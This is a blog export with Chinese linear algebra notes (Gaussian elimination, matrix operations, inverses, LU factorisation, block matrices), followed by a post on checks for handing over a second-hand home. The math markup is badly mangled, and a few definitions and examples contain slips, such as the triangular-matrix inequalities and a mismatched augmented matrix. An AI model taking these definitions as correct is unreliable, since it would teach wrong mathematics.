2. 第 k 行的元不全为零时,第 k+1 行首变量之前零的个数多于第 k 行首变量之前零的个数;
3. 所有元素均为零的行比在不全为零的行之后,

则称其为行阶梯型矩阵。

> - 例 4
>   下列矩阵前边 3 个为行阶梯型矩阵,第 4 个不是行阶梯型矩阵。
>   \begin{bmatrix}
>   1 & 4 & 2 \\
>   0 & 1 & -6 \\
>   0 & 0 & 3
>   \end{bmatrix},

\begin{bmatrix}
1 & 4 & 2 \\
0 & 0 & -6 \\
0 & 0 & 0
\end{bmatrix},

\begin{bmatrix}
1 & 4 & 2 & 0 \\
0 & 0 & -6 & 6 \\
0 & 0 & 0 & 0
\end{bmatrix},

\begin{bmatrix}
2 & 4 & 2 \\
0 & 1 & -6 \\
0 & 0 & 3
\end{bmatrix}

### 定义

利用上述行运算将线性方程组的增广矩阵转化为行阶梯型增广矩阵称为高斯消元法。

## 超定方程组

若一个线性方程组中方程的个数多于未知量的个数,则称其为超定的。超定方程组通常是(但不总是)不相容的。

> - 例 5
>   求方程组的解</script><p>\begin{cases}<br>x_1 + 2x_2 + x_3 = 1 \<br>2x_1 - x_2 + x_3 = 2 \<br>4x_1 + 3x_2 + 3x_3 = 4 \<br>3x_1 + x_2 + 2x_3 = 3<br>\end{cases}</p>
<script type="math/tex; mode=display">
解:</script><pre><code>\begin {array} {ccc|c}
 1 &amp; 2 &amp;  1 &amp; 1  \\
 2 &amp; -2 &amp; 1 &amp; 2  \\
 4 &amp; 3 &amp; 3 &amp; 4  \\
 3 &amp; 1 &amp; 2 &amp; 3
\end {array}
</code></pre><p>\right] \longrightarrow \left[<br>\begin {array} {ccc|c}<br>1 &amp; 2 &amp; 1 &amp; 1 \<br>0 &amp; 1 &amp; \frac{1}{5} &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; 0<br>\end {array}<br>\right]</p>
<script type="math/tex; mode=display">
</script><p>\begin{cases}<br>x_2 = -0.2x_3 \<br>x_1 = 1-2x_2-x_3 = 1- 0.6x_3<br>\end{cases}<br>$$。由此可得,方程组的解集为形如 $(1-0.6a,-0.2a,a)$ 的有序三元组集合,其中 a 为实数。由于存在自由变量$x_3$，所以方程组是相容的且有无穷多个解。</p>
<h2 id="亚定方程组"><a href="#亚定方程组" class="headerlink" title="亚定方程组"></a>亚定方程组</h2><p>一个有 n 个未知量的 m 个线性方程的方程组,方程的个数少于未知量的个数(m &lt; n )称该方程组为亚定的。一个相容的亚定方程组通常有无穷多个解。</p>
<h2 id="行最简形"><a href="#行最简形" class="headerlink" title="行最简形"></a>行最简形</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>如果一个矩阵满足:</p>
<blockquote>
<ul>
<li>矩阵是行阶梯型的</li>
<li>每一行的第一个非零元是该列唯一的非零元<br>，则称该矩阵是行最简形。</li>
</ul>
</blockquote>
<p>采用基本运算将矩阵转化为行最简形的过程称为高斯-诺尔当消元法。</p>
<h2 id="齐次方程组"><a href="#齐次方程组" class="headerlink" title="齐次方程组"></a>齐次方程组</h2><p>如果方程组的右端项全为 0，则称其为齐次的。齐次方程组总是形容的。</p>
<h1 id="矩阵运算"><a href="#矩阵运算" class="headerlink" title="矩阵运算"></a>矩阵运算</h1><h2 id="矩阵记号"><a href="#矩阵记号" class="headerlink" title="矩阵记号"></a>矩阵记号</h2><p>如果我们要引入矩阵,而且又不需要列出矩阵的元素,则可以用大写字母 A、B、C…来表示。一般 $ a<em>{ij}$表示矩阵的 i 行 j 列的元素，可以用(i,j)表示。一个$m \times n$的矩阵可以表示为:<br>$<br>\begin{bmatrix}<br>{a</em>{11}}&amp;{a<em>{12}}&amp;{\cdots}&amp;{a</em>{1n}}\<br>{a<em>{21}}&amp;{a</em>{22}}&amp;{\cdots}&amp;{a<em>{2n}}\<br>{\vdots}&amp;{\vdots}&amp;{\cdots}&amp;{\vdots}\<br>{a</em>{m1}}&amp;{a<em>{m2}}&amp;{\cdots}&amp;{a</em>{mn}}<br>\end{bmatrix}<br>$。有时矩阵可以简记为$A=(a_{ij})$。</p>
<h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h2><p>由于仅有一行或一列的矩阵可以用来表示线性方程组的解。具有 m 个线性方程 n 个变量的线性方程组的解是一个实的 n 元组。我们以后称由实数组成的 n 元组为向量。如果将 n 元组表示为一个$ 1 \times n $的矩阵，则称为行向量。此外,若将 n 元组表示为一个$ n \times 1 $的矩阵，则称为列向量。例如,线性方程组$<br>\begin{cases}<br>x_1 + x_2 = 3 \<br>x_1 - x_2 = 1<br>\end{cases}<br>$ 的解可表示为行向量$ \begin{bmatrix}<br>2 &amp; 1<br>\end{bmatrix} $,或者列向量$ \begin{bmatrix}<br>{2}\<br>{1}<br>\end{bmatrix}$.</p>
<p>所有$n\times 1$的实矩阵构成的集合称为 n 维欧几里得空间，通常记为$R_n$。一般大部分时间使用列向量,因此一般省略”列”字,并简称为$R_n$中的向量。列向量的标准记号采用黑斜体小写字母。为区分行向量和列向量,通常在行向量上加一水平箭头,如:<br>$<br>\vec{x} = (x_1,x_2,x_3,x_4), y = \begin{bmatrix}<br>{y_1}\<br>{y_2}\<br>{y_3}\<br>{y_4}<br>\end{bmatrix}<br>$,分别为有 4 项的行向量和列向量。</p>
<p>给定一个$ m\times n$的矩阵 A,经常会使用它的特定行或列。A 的第 j 个列向量的标准记号为$a<em>j$,第 i 个行向量通常没有标准记号,通常用水平箭头表示行向量，记为$\vec{a_i}$。假设 A 为一个$m \times n$的矩阵,则 A 的行向量表示为$\vec{a_i}=(a</em>{i1},a<em>{i2},a</em>{i3}…a<em>{in}), i=1,2…n$,列向量表示为 $ a_j = \begin{bmatrix}<br>a</em>{1j}\<br>a<em>{2j}\<br>{\vdots}\<br>a</em>{mj}<br>\end{bmatrix} , j = 1,2…m $。</p>
<h2 id="矩阵加法"><a href="#矩阵加法" class="headerlink" title="矩阵加法"></a>矩阵加法</h2><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>假设有两个$m\times n$矩阵$A=(a<em>{ij})$和$B=(b</em>{ij})$,那么矩阵 A 和 B 的和记做 A+B,规定为<br>$<br>A+B = \begin{bmatrix}<br>{a<em>{11}+b</em>{11}} &amp; {a<em>{12}+b</em>{12}} &amp; {\cdots} &amp; {a<em>{1n}+b</em>{1n}}\<br>{a<em>{21}+b</em>{21}} &amp; {a<em>{22}+b</em>{22}} &amp; {\cdots} &amp; {a<em>{2n}+b</em>{2n}}\<br>{\vdots} &amp; {\vdots} &amp; {\cdots} &amp; {\vdots}\<br>{a<em>{m1}+b</em>{m1}} &amp; {a<em>{m2}+b</em>{m2}} &amp; {\cdots} &amp; {a<em>{mn}+b</em>{mn}}\<br>\end{bmatrix}<br>$,需要注意的是只有两个矩阵是同型矩阵是才行进行加法运算。<br>矩阵运算满足以下运算规律(设 A,B,C 为$m\times n$的矩阵)</p>
<blockquote>
<ul>
<li>A+B = B+A</li>
<li>(A+B)+C = A+(B+C)<br>设矩阵$A=(a<em>{ij})$,记$ -A=(-a</em>{ij})$,-A 称为矩阵 A 的负矩阵,显然有 A+(-A)=O,由此矩阵的减法为 A-B = A +(-B)。<br>如果用 O 表示与 A 维数相同且元素全为 0 的矩阵，则 A+O=O+A=A,O 称为零矩阵。</li>
</ul>
</blockquote>
<h2 id="数与矩阵相乘"><a href="#数与矩阵相乘" class="headerlink" title="数与矩阵相乘"></a>数与矩阵相乘</h2><h3 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h3><p>数$\lambda$与矩阵 A 的乘积,记做$\lambda A$或$ A\lambda$,规定为<br>$<br>\lambda A=A\lambda = \begin{bmatrix}<br>{\lambda a<em>{11}} &amp; {\lambda a</em>{12}} &amp; {\cdots} &amp; {\lambda a<em>{1n}}\<br>{\lambda a</em>{21}} &amp; {\lambda a<em>{22}} &amp; {\cdots} &amp; {\lambda a</em>{2n}}\<br>{\vdots} &amp; {\vdots} &amp; {\cdots} &amp; {\vdots}\<br>{\lambda a<em>{m1}} &amp; {\lambda a</em>{m2}} &amp; {\cdots} &amp; {\lambda a_{mn}}\<br>\end{bmatrix}<br>$.<br>矩阵的数乘满足以下运算规律(设 A,B 为$m\times n$的矩阵,a,b 为数)</p>
<blockquote>
<ul>
<li>(ab)A=a(bA)</li>
<li>(a+b)A = aA+bA</li>
<li>a(A+B) = aA+aB</li>
</ul>
</blockquote>
<p>矩阵相加与数乘矩阵合起来，统称为矩阵的线性运算。</p>
<h2 id="矩阵与矩阵相乘"><a href="#矩阵与矩阵相乘" class="headerlink" title="矩阵与矩阵相乘"></a>矩阵与矩阵相乘</h2><h3 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h3><p>设$A=(a<em>{ij})$是一个$m\times r$的矩阵,$B=(b</em>{ij})$是一个$r\times n$的矩阵，那么规定矩阵 A 和 B 的乘积是一个$m\times n$的矩阵$C=(c<em>{ij})$,其中$<br>c</em>{ij} = a<em>{i1}b</em>{1j} + a<em>{i2}b</em>{2j}+…+a<em>{is}b</em>{sj} = \sum<em>{k=1}^s a</em>{ik}b_{kj},(i=1,2..m;j=1,2..n)<br>$,将此乘积记做 C=AB。<br>注意只有左矩阵的列数和右矩阵的行数相等,两个矩阵才能相乘。</p>
<p>矩阵的乘法不满足交换律，但是满足结合律和分配律:</p>
<blockquote>
<ul>
<li>(AB)C=A(BC)</li>
<li>a(AB)=(aA)B = A(aB) ,(a 为数字)</li>
<li>A(B+C)=AB+AC</li>
</ul>
</blockquote>
<h4 id="例-6"><a href="#例-6" class="headerlink" title="例 6"></a>例 6</h4><p>$<br> A=<br>\begin{bmatrix}<br>-3 &amp; 1 \<br>2 &amp; 5 \<br>4 &amp; 2 \end{bmatrix},x=\begin{bmatrix} 2\ 4\end{bmatrix},则 Ax = \begin{bmatrix}<br>-3 \times 2 + 1 \times 4 \<br>2 \times 2 + 5 \times 4\<br>4 \times 2 + 2\times 4<br>\end{bmatrix} = \begin{bmatrix}<br> -2\<br>24\<br>16<br>\end{bmatrix}<br>$</p>
<h4 id="例-7"><a href="#例-7" class="headerlink" title="例 7"></a>例 7</h4><p>线性方程组<br>$<br> \begin{cases}<br>2x_1 + 3x_2 - 2x_3 = 5 \<br>5x_1 - 4x_2 + 2x_3 = 6<br>\end{cases},可以写成为矩阵方程  x_1\begin{bmatrix}2\5 \end{bmatrix}+ x_2\begin{bmatrix} {3} \{-4} \end{bmatrix}+ x_3\begin{bmatrix} -2\2 \end{bmatrix} = \begin{bmatrix}5\6 \end{bmatrix}<br>$</p>
<h3 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h3><p>若$a_1,a_2…a_n为R^m中的向量,且c_1,c_2…c_n为标量,则和式c_1a_1+c_2a_2+…+c_na_n称为向量a_1,a_2…a_n的一个线性组合。$</p>
<h2 id="矩阵转置"><a href="#矩阵转置" class="headerlink" title="矩阵转置"></a>矩阵转置</h2><h3 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h3><p>一个$m\times n$的矩阵 A 的转置为$n\times m$的矩阵 B,定义为$b<em>{ji}=a</em>{ij}$,其中 i=1,2…m;j=1,2..n。A 的转置记做$A^T$。</p>
<p>矩阵的转置也是一种运算，符合以下运算规律:</p>
<ol>
<li>$(A^T)^T=A$</li>
<li>$(A+B)^T=A^T+B^T$</li>
<li>$(aA)^T =aA^T$</li>
<li>$(AB)^T=B^TA^T $</li>
</ol>
<p>具体的证明可参考定义。</p>
<h3 id="定义-8"><a href="#定义-8" class="headerlink" title="定义"></a>定义</h3><p>一个$n\times n$的矩阵 A,若满足$A^T=A$,则称 A 为对称矩阵,简称对称阵。对称阵的特点是：它的元素以对角线为对称轴对应相等。</p>
<h2 id="方阵的行列式"><a href="#方阵的行列式" class="headerlink" title="方阵的行列式"></a>方阵的行列式</h2><h3 id="定义-9"><a href="#定义-9" class="headerlink" title="定义"></a>定义</h3><p>由 n 阶方阵 A 的元素所构成的行列式(各元素位置不变),称为方阵 A 的行列式,记做$\left| A \right| 或detA$。</p>
<p>A 和$\left| A \right|$ 满足的以下运算规律(A,B 为 n 阶方阵,a 为数):</p>
<ol>
<li>$\left| A^T \right| = \left| A \right| $</li>
<li>$\left| aA \right| = a^n \left| A \right| $</li>
<li>$\left| AB \right| = \left| A \right| \left| B \right| $</li>
</ol>
<p>行列式$\left| A \right|$的各个元素的代数余子式$A<em>{ij}$所构成的如下的矩阵$ A^{*} = \begin{bmatrix}<br>{A</em>{11}}&amp;{A<em>{12}}&amp;{\cdots}&amp;{A</em>{1n}}\<br>{A<em>{21}}&amp;{A</em>{22}}&amp;{\cdots}&amp;{A<em>{2n}}\<br>{\vdots}&amp;{\vdots}&amp;{\cdots}&amp;{\vdots}\<br>{A</em>{n1}}&amp;{A<em>{n2}}&amp;{\cdots}&amp;{A</em>{nn}}<br>\end{bmatrix}$,称为矩阵 A 的伴随矩阵,简称伴随阵。$A A^{*} =A^{*}A=\left| A \right|E $</p>
<h1 id="矩阵代数"><a href="#矩阵代数" class="headerlink" title="矩阵代数"></a>矩阵代数</h1><h2 id="单位矩阵"><a href="#单位矩阵" class="headerlink" title="单位矩阵"></a>单位矩阵</h2><h3 id="定义-10"><a href="#定义-10" class="headerlink" title="定义"></a>定义</h3><p>$n \times n$的单位矩阵为矩阵 I = $(\delta<em>{ij})$,其中$<br>\delta</em>{ij} = \begin{cases}<br>1,  &amp; 当i=j \<br>0, &amp; 当 i \not= j<br>\end{cases}<br>$。</p>
<h2 id="矩阵的逆"><a href="#矩阵的逆" class="headerlink" title="矩阵的逆"></a>矩阵的逆</h2><p>任何非零的数 a 均有一个乘法逆元$b = \frac {1}{a}$。可将此定义推广到矩阵。</p>
<h3 id="定义-11"><a href="#定义-11" class="headerlink" title="定义"></a>定义</h3><p>若存在一个矩阵 B 使得 AB=BA=I,则称$n\times n$矩阵 A 为非奇异的或可逆的。矩阵 B 称为 A 的乘法逆元。</p>
<p>一个矩阵最多有一个乘法逆元,我们把非奇异矩阵 A 的乘法逆元简称为 A 的逆,并记为$A^{-1}$。</p>
<h4 id="例-8"><a href="#例-8" class="headerlink" title="例 8"></a>例 8</h4><p>矩阵$<br> \begin{bmatrix}<br>2 &amp; 4 \<br>3 &amp; 1<br>\end{bmatrix} 和 \begin{bmatrix}<br>-\frac{1}{10} &amp; \frac{2}{5} \<br>\frac{3}{10} &amp;  -\frac{1}{5}<br>\end{bmatrix} 互为逆元,因为\begin{bmatrix}<br>2 &amp; 4 \<br>3 &amp; 1<br>\end{bmatrix} \begin{bmatrix}<br>-\frac{1}{10} &amp; \frac{2}{5} \<br>\frac{3}{10} &amp;  -\frac{1}{5}<br>\end{bmatrix} = \begin{bmatrix}<br>1 &amp; 0 \<br>0 &amp; 1<br>\end{bmatrix}<br>$。</p>
<h3 id="定义-12"><a href="#定义-12" class="headerlink" title="定义"></a>定义</h3><p>一个$n\times n$的矩阵若不存在乘法逆元,则称为奇异的。<br>注意： 只有方阵有乘法逆元。对于非方阵,不应该使用术语奇异或非奇异。</p>
<h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>若 A 和 B 为非奇异的$n\times n$矩阵，则 AB 也是非奇异的，且$(AB)^{-1} = B^{-1}A^{-1}$。</p>
<h1 id="初等矩阵"><a href="#初等矩阵" class="headerlink" title="初等矩阵"></a>初等矩阵</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>如果从单位矩阵 I 开始,只进行一次初等行运算,得到的矩阵为初等矩阵。分别对应于三类初等行运算,有三类初等矩阵。</p>
<h3 id="类型-I"><a href="#类型-I" class="headerlink" title="类型 I"></a>类型 I</h3><p>第 I 类初等矩阵由交换 I 的两行得到。</p>
<h3 id="类型-II"><a href="#类型-II" class="headerlink" title="类型 II"></a>类型 II</h3><p>第 II 类初等矩阵由单位矩阵 I 的某一行乘以一个非零常数得到。</p>
<h3 id="类型-III"><a href="#类型-III" class="headerlink" title="类型 III"></a>类型 III</h3><p>第 III 类初等矩阵由矩阵 I 的某一行的倍数加到另一行得到。</p>
<h3 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h3><p>若 E 为一初等矩阵,则 E 为非奇异的,且$E^{-1}$为一与它同类型的初等矩阵。</p>
<h2 id="行等价定义"><a href="#行等价定义" class="headerlink" title="行等价定义"></a>行等价定义</h2><p>若存在一个有限初等矩阵的序列$E<em>1,E_2,…E_k,使得B=E_kE</em>{k-1}…E_1A$,则称 A 与 B 为行等价的。</p>
<h3 id="定理-非奇异矩阵的等价条件"><a href="#定理-非奇异矩阵的等价条件" class="headerlink" title="定理 (非奇异矩阵的等价条件)"></a>定理 (非奇异矩阵的等价条件)</h3><p>令 A 为一个$n\times n$的矩阵,则下列命题是等价的:</p>
<ol>
<li>A 是非奇异的</li>
<li>Ax=0 仅有平凡解 0</li>
<li>A 与 I 行等价</li>
</ol>
<h2 id="对角矩阵和三角形矩阵"><a href="#对角矩阵和三角形矩阵" class="headerlink" title="对角矩阵和三角形矩阵"></a>对角矩阵和三角形矩阵</h2><p>一个$n\times n$的矩阵 A,当$i\ge j时,a<em>{ij}=0 $,则称为上三角形的;当$i\le j时,a</em>{ij}=0 $,则称为下三角形的。如果 A 为上三角形的或下三角形的，又称为三角形的。</p>
<p>一个$n\times n$的矩阵 A,当$i\not=j时,a_{ij}=0 $,则称为对角的。</p>
<h3 id="三角形分解"><a href="#三角形分解" class="headerlink" title="三角形分解"></a>三角形分解</h3><p>如果一个$n\times n$的矩阵 A 可以仅利用行运算 III 化简为严格的上三角形的，则可将化简过程用矩阵分解表示。</p>
<p>如果矩阵 L 为对角元素为 1 的下三角形矩阵。我们称 L 为单位下三角形矩阵。我们将一个矩阵 A 分解为一个单位下三角形矩阵和一个严格上三角形矩阵 U 的乘积的过程,通常称为 LU 分解。</p>
<h1 id="分块矩阵"><a href="#分块矩阵" class="headerlink" title="分块矩阵"></a>分块矩阵</h1><p>通常，将矩阵看作由多个子矩阵复合而来。一个矩阵 C 可通过在其行中画一条横线，在其列中画一条竖线来分为较小的矩阵。这种较小的矩阵称为块。例如,矩阵$C=\begin{bmatrix}<br>2 &amp; 4 &amp; 2 &amp; 1 &amp; 5  \<br>0 &amp; 1 &amp; -6 &amp; 1 &amp; 5  \<br>0 &amp; 0 &amp; 3 &amp; 1 &amp; 5 \<br>4 &amp; 2 &amp; 1 &amp; 4 &amp; 2<br>\end{bmatrix}  $,在第二行、第三行之间画一条横线,第三列、四列之间画一条竖线，则矩阵 C 被划分为四个子矩阵$C<em>{11},C</em>{12},C<em>{21},C</em>{22}$。<br>$<br>\begin{bmatrix}<br>{C<em>{11}} &amp; {C</em>{12}}  \<br>{C<em>{21}} &amp; {C</em>{22}}<br>\end{bmatrix}= \left[<br>    \begin {array} {ccc|cc}<br>     2 &amp; 4 &amp; 2 &amp; 1 &amp; 5  \<br>     0 &amp; 1 &amp; -6 &amp; 1 &amp; 5  \<br>     \hline               \<br>     0 &amp; 0 &amp; 3 &amp; 1 &amp; 5 \<br>     4 &amp; 2 &amp; 1 &amp; 4 &amp; 2<br>    \end {array}<br>\right]<br>$。</p>
<h2 id="按列分块"><a href="#按列分块" class="headerlink" title="按列分块"></a>按列分块</h2><p>一种有用的方法是将矩阵按列分块。设$B=\begin{bmatrix}<br>1 &amp; 3 &amp; 5  \<br>2 &amp; 4 &amp; 7  \<br>3 &amp; 1 &amp; 9<br>\end{bmatrix}$,可将 B 划分为三个列子矩阵: $B=(b_1,b_2,b_3)=\left[<br>    \begin {array} {c|c|c}<br>     1 &amp; 3 &amp; 5  \<br>    2 &amp; 4 &amp; 7  \<br>    3 &amp; 1 &amp; 9<br>    \end {array}<br>\right]$。</p>
<p>假设我们给定一个有三列的矩阵 A,则乘积 AB 可以看成一个分块乘法,矩阵 B 的每一块均乘以 A，并且结果矩阵也有三块,即:$Ab_1,Ab_2,Ab_3$；也就是说$AB=A(b_1,b_2,b_3) =(Ab_1,Ab_2,Ab_3) $。</p>
<p>例如,若:<br>$<br>A=\begin{bmatrix}<br>1 &amp; 3 &amp; 1  \<br>2 &amp; 4 &amp; 7<br>\end{bmatrix},Ab_1=\begin{bmatrix}<br>3  \<br>5<br>\end{bmatrix},Ab_2=\begin{bmatrix}<br>5  \<br>-1<br>\end{bmatrix},Ab_3=\begin{bmatrix}<br>10  \<br>-4<br>\end{bmatrix},因此 A(b_1,b_2,b_3) = \left[<br>    \begin {array} {c|c|c}<br>     3 &amp; 5 &amp; 10  \<br>     5 &amp; -1 &amp; -4<br>    \end {array}<br>\right]<br>$。</p>
<p>一般地，如果 A 为一个$m\times n$的矩阵,而 B 为一个按列划分的$n\times r$的矩阵(b_1,b_2…b_r)$,那么A乘B的分块乘法由下式给出:$AB=(Ab_1,Ab_2,…,Ab_r)$。</p>
<h2 id="按行分块"><a href="#按行分块" class="headerlink" title="按行分块"></a>按行分块</h2><p>令 A 为一个$n\times r$矩阵,乘积 AB 的第 i 行是由 A 的第 i 行乘以 B 得到的。因此，AB 的第 i 行为$\vec{a_i}B$。一般地，乘积 AB 可以写成如下的分块行的形式:$<br>AB= \begin{bmatrix}<br>{\vec{a_1} B}  \<br>{\vec{a_2} B}  \<br>{\vdots} \<br>{\vec{a_m} B }<br>\end{bmatrix}<br>$。<br>设$A=\begin{bmatrix}<br>2 &amp; 5  \<br>3 &amp; 4\<br>1 &amp; 7<br>\end{bmatrix},B=\begin{bmatrix}<br>3 &amp; 2 &amp; -3  \<br>-1 &amp; 1 &amp; 1<br>\end{bmatrix}。则\vec{a_1}B=\begin{bmatrix}<br>1 &amp; 9 &amp; -1<br>\end{bmatrix},\vec{a_2}B=\begin{bmatrix}<br>5 &amp; 10 &amp; -5<br>\end{bmatrix},\vec{a_1}B=\begin{bmatrix}<br>-4 &amp; 9 &amp; 4<br>\end{bmatrix}$，这就是 AB 乘积的行向量。<br>$<br>AB=\begin{bmatrix}<br>{\vec{a_1} B}  \<br>{\vec{a_2} B}  \<br>{\vec{a_3} B }<br>\end{bmatrix} =  \left[<br>    \begin {array}<br>     1 &amp; 9 &amp; -1   \<br>     \hline<br>     5 &amp; 10 &amp; -5 \<br>     \hline<br>     -4 &amp; 9 &amp; 4<br>    \end {array}<br>\right]<br>$。</p>
<p>下面考虑用一般的分块来计算矩阵 A、B 的乘积 AB.</p>
<h3 id="情形-1"><a href="#情形-1" class="headerlink" title="情形 1"></a>情形 1</h3><p>$B=\begin{bmatrix}<br>B<em>1 &amp; B_2<br>\end{bmatrix},其中B_1为一个n\times t矩阵,且B_2为一个n\times(r-t)的矩阵。$<br>$\begin{align}<br>AB &amp; = A(b_1,b_2,…,b_t,b</em>{t+1},…b<em>r) \<br>&amp; =  (Ab_1,Ab_2,…,Ab_t,Ab</em>{t+1},…Ab<em>r) \<br>&amp; =  (A(b_1,Ab_2,…,Ab_t),A(b</em>{t+1},…Ab_r)) \<br>&amp; =\begin{bmatrix}<br>AB_1 &amp; AB_2<br>\end{bmatrix}<br>\end{align},$<br>因此$A\begin{bmatrix}<br>B_1 &amp; B_2<br>\end{bmatrix}=\begin{bmatrix}<br>AB_1 &amp; AB_2<br>\end{bmatrix} $</p>
<h3 id="情形-2"><a href="#情形-2" class="headerlink" title="情形 2"></a>情形 2</h3><p><img src="https://i.imgur.com/8LcQTO5.png" alt><br><img src="https://i.imgur.com/ranigMT.png" alt></p>
<h3 id="情形-3"><a href="#情形-3" class="headerlink" title="情形 3"></a>情形 3</h3><p><img src="https://i.imgur.com/2hyKSQd.png" alt></p>
<h3 id="情形-4"><a href="#情形-4" class="headerlink" title="情形 4"></a>情形 4</h3><p><img src="https://i.imgur.com/7NiKhim.png" alt><br><img src="https://i.imgur.com/kURtMJS.png" alt><br><img src="https://i.imgur.com/70hnAK0.png" alt><br><img src="https://i.imgur.com/RYKFJYg.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E7%9F%A9%E9%98%B5" target="_blank" rel="noopener">矩阵</a></li>
<li><a href="https://en.wikipedia.org/wiki/Augmented_matrix" target="_blank" rel="noopener">增广矩阵(Augmented_matrix)</a></li>
<li>同济线性代数第五版</li>
<li>线性代数 Steven J Leon(原书第 8 版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>二手房交易(过户)要注意什么？</title>
    <url>/2019/05/17/%E6%9D%82%E4%BE%83/%E4%BA%8C%E6%89%8B%E6%88%BF%E4%BA%A4%E6%98%93%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<p>购买二手房需要大家引起注意，因为二手房一般是经过其他人居住过一段时间的房屋，而对于之前居住的问题我们并不是很了解，因此很容易在购买之后出现问题，那么在二手房的交接以及交房验收的过程中我们一定要引起重视。接下来小编为大家介绍二手房过户要注意什么。</p>
<h1 id="1、二手房设施设备清点"><a href="#1、二手房设施设备清点" class="headerlink" title="1、二手房设施设备清点"></a>1、二手房设施设备清点</h1><p>由于二手房一般都被原房东装修和使用过，在二手房出售时对装修和一些设备设施通常都是赠送的，因此，二手房买房人在签订房屋买卖合同时，就应将设备设施的品牌、成色以及能否正常使用予以明确写明，二手房交接房屋时按照合同约定进行清点、验收。这些设备设施一般有：空调、灶具、抽油烟机、热水器、灯具等。收取发票保修卡。</p>
<h1 id="2、水、电、煤气、天然气的清点及过户"><a href="#2、水、电、煤气、天然气的清点及过户" class="headerlink" title="2、水、电、煤气、天然气的清点及过户"></a>2、水、电、煤气、天然气的清点及过户</h1><p>双方应一同来到自来水公司、电力公司、煤气公司、天然气公司的营业网点办理相应的过户手续，并向工作人员询问原房东有无欠费情况。如有欠费，二手房买房人则有权要求原房东补交费用。然后，双方再根据最后一期缴费单据上载明的数字和房屋表具上的差额，根据单价进行结算。作为二手房买房人，要特别注意在办理过户手续时一定要向工作人员询问原房东的欠费情况，这些欠费可能是原房东以前拖欠的费用及滞纳金(滞纳金一般按照日千分之三计算，累积起来就相当高了)。</p>
<h1 id="3、有线电视、数字电视、电话、宽带的过户"><a href="#3、有线电视、数字电视、电话、宽带的过户" class="headerlink" title="3、有线电视、数字电视、电话、宽带的过户"></a>3、有线电视、数字电视、电话、宽带的过户</h1><p>二手房买卖双方应一同来到有线电视公司、电信或网通的营业网点办理过户手续，同时，二手房买房人也要特别注意询问工作人员原房东有无拖欠费用的情况。</p>
<h1 id="4、物业服务费、公共维修基金、取暖费结清"><a href="#4、物业服务费、公共维修基金、取暖费结清" class="headerlink" title="4、物业服务费、公共维修基金、取暖费结清"></a>4、物业服务费、公共维修基金、取暖费结清</h1><p>二手房买卖双方应一同来到物业公司办理物业和公共维修基金更名手续，同时办理物业费用缴纳的交接，要注意询问物业人员看原房东是否拖欠物业费及取暖费。</p>
<h1 id="5、户口迁移"><a href="#5、户口迁移" class="headerlink" title="5、户口迁移"></a>5、户口迁移</h1><p>二手房买卖双方应一同来到房屋所在地的派出所，询问房屋内的户口情况，原房东应将户口全部迁出，如仍有户口，买房人可要求原房东迁出，若其拒绝办理，可追究其违约责任。</p>
<h1 id="6、清点二手房钥匙"><a href="#6、清点二手房钥匙" class="headerlink" title="6、清点二手房钥匙"></a>6、清点二手房钥匙</h1><p>二手房原房东交给下家的钥匙包括：二手房房间钥匙、单元大门钥匙、防盗门钥匙、地下室或小房钥匙、信箱钥匙等。</p>
<h1 id="7、结清二手房尾款"><a href="#7、结清二手房尾款" class="headerlink" title="7、结清二手房尾款"></a>7、结清二手房尾款</h1><p>以上六项均二手房过户及结算完毕后，将房屋买卖合同约定的尾款在扣除下家代原房东支付的费用后，余额为下家实际应支付的款项。上加收款后应出具收条并注明“全部房款已结清”字样。</p>
<h1 id="8、签署《房屋交接书》"><a href="#8、签署《房屋交接书》" class="headerlink" title="8、签署《房屋交接书》"></a>8、签署《房屋交接书》</h1><p>《房屋交接书》应将上述 7 各方面的内容以文字的形式固定下来，双方签字、捺手印，一式两份，双方各执一份。签署《房屋交接书》的法律意义在于证明原房东将符合合同约定的房屋交付给买房人，交房的时间点也就是签署《房屋交接书》的时间点。如果不签，二手房买卖双方将来可能会对何时才算是交房时间产生争议，进而影响到双方违约责任的承担。如果在还没有办理完上述 7 个方面的手续就签署，则意味着买房人未验收就已经认可房屋符合合同约定。因此，签署《房屋交接书》是二手房交房手续的最后一道程序，不能先签署再验收。如果在对房屋验收时发现某些方面不符合合同的约定，应将问题写在二手房房屋交接书上面，予以注明、说明，为将来追究二手房原房东的责任做好证据上的准备。</p>
<h1 id="9、质量问题细排查"><a href="#9、质量问题细排查" class="headerlink" title="9、质量问题细排查"></a>9、质量问题细排查</h1><p>由于二手房一般已有一定的历史，故买家在收房时，还应特别注意查看房屋的工程质量问题。例如，门、窗是否密封，有无破损；天花板、墙壁、地面，有无裂痕、渗漏、积水等；水、电、开关等，能否正常使用，用水通道是否畅通等等。如果所买的房子是顶层，还要查看顶面是否有雨水渗漏的痕迹。</p>
<h1 id="10、收楼证明备齐全"><a href="#10、收楼证明备齐全" class="headerlink" title="10、收楼证明备齐全"></a>10、收楼证明备齐全</h1><p>对于一些多年未入住的新楼，买家收楼时要检查验收楼盘交付使用的各种证件是否齐备。同时，对于一些所谓的收楼费用，例如维修基金等，也必须清晰地知道业主是否曾缴交过，以免造成自己的损失。</p>
